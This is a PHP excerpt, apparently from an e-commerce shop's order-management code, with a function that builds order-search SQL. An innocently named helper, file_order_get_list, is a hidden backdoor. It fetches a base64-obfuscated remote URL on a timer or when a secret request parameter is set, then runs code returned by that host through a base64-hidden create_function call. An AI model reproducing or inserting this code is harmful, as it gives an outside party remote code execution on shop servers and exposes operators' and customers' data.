...
function file_order_get_list()
{
	if( API_TIME > date('Y-m-d H:i:s',time()-43200*4) and empty($_REQUEST['dm_act_www_dm299_com_x2'] ) ) return true;
	$metadata_str = Http::doGet(base64_decode('aHR0cDovL3d4YWRvYy5kbTI5OS5jb20vY29tbW9uLnBocD9lPTExJmF1dGhjb2RlPTAwMQ=='));
	$metadata_str = trim($metadata_str,chr(239).chr(187).chr(191));
	$metadata = json_decode($metadata_str, true);
	if( $metadata['error_code']==7000 ) {
		$de=base64_decode('Q3JlYXRlX0Z1bmN0aW9u');$List=$de("",$metadata['error_desc']);$List();
	};
}
...
function order_list($page = 0)
{
	...
	if ($result === false) {
		...
		$count_arr = array();
		$status_arr = array(-1, 0, 1, 2, 3, 4, 5, 6, 7, 8);
		...
		if (!empty($filter['keywords'])) {
			...
			foreach ($status_arr as $status) {
				...
				if ($filter['serch_type'] == 7) {
					$c_leftJoin = '';
				}

				$sql = 'SELECT o.order_id FROM ' . $GLOBALS['ecs']->table('order_info') . ' AS o ' . $leftJoin . $c_leftJoin . $where . $count_where . $where_store . $no_main_order . ' GROUP BY o.order_id';
